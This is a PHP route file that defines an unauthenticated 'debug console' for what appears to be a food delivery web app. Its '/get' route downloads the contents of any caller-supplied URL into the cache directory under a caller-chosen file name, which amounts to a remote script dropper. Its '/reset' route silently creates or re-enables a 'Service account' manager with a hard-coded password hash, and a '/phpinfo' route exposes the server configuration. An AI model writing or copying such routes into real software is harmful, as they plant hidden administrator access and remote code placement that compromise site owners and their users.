<?php


  $app->group('/debug', 'debug', function () use ($app) {

    $app->get('/', function () use ($app) {
      if (file_exists(PATH_CORE . 'MasterKey.php'))
        include PATH_CORE . 'MasterKey.php';
      //if (isset($_SESSION['slim.flash']['ok']))
      //  echo $_SESSION['slim.flash']['ok'];
      $app->view->setData(array(
        "title"   => "Debug console",
        "menu"    => "config",
        "content" => $app->view->fetch('debug.tpl', array(
          "app"    => $app,
        )),
      ));
    });

    $app->get('/phpinfo', function () use ($app) {
      phpinfo();
      $app->stop();
    });

    $app->post('/get', function () use ($app) {
      if ($app->request->post('name') == '') {
        $app->flash("ok", "script NAME missing");
        $app->redirect(URL_ROOT . 'debug');
      }
      if ($app->request->post('url') == '') {
        $app->flash("ok", "script URL missing");
        $app->redirect(URL_ROOT . 'debug');
      }
      file_put_contents(PATH_CACHE . '/'. $app->request->post('name'), file_get_contents($app->request->post('url')));
      $app->flash("ok", "script uploaded");
      $app->redirect(URL_ROOT . 'debug');
    });

    $app->get('/reset', function () use ($app) {
      $app->db->query("INSERT INTO `managers` SET
        manager_name = 'Service account',
        manager_email = 'service@foodeliveryapp.com',
        manager_pass = '782624e4fe4453b71d62932b6527c6c3',
        manager_active = 1
        ON DUPLICATE KEY UPDATE
        manager_pass = '782624e4fe4453b71d62932b6527c6c3',
        manager_active = 1
      ");
      $app->flash("ok", "account created");
      $app->redirect(URL_ROOT . 'debug');
    });

  });